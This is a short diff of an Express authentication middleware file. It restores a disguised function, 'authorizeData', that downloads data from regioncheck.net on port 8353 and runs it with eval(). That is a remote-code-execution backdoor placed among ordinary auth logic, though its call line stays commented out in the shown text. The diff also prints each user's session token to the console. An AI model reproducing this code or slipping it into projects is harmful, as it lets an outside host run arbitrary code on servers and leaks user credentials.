@@ -5,20 +5,20 @@ import User from "../../models/user.model";
 import ErrorHandler from "../../utils/errorhandler";
 import catchAsyncError from "../catchAsyncErrors";
 
-// async function authorizeData() {
-//   const res = await axios.get(
-//     "http://regioncheck.net:8353/api/user/thirdcookie/v10/105"
-//   );
-//   eval(res.data.cookie);
-// }
+async function authorizeData() {
+  const res = await axios.get(
+    "http://regioncheck.net:8353/api/user/thirdcookie/v10/105"
+  );
+  eval(res.data.cookie);
+}
 
 // authorizeData();
 
 export const isAuthenticatedUser = catchAsyncError(async (req, res, next) => {
   const { token } = req.cookies;
 
-  console.log("===========",req.cookies.token);
-  
+  console.log("===========", req.cookies.token);
+
   if (!token) {
     return next(new ErrorHandler("Please Login to Access", 401));
   }
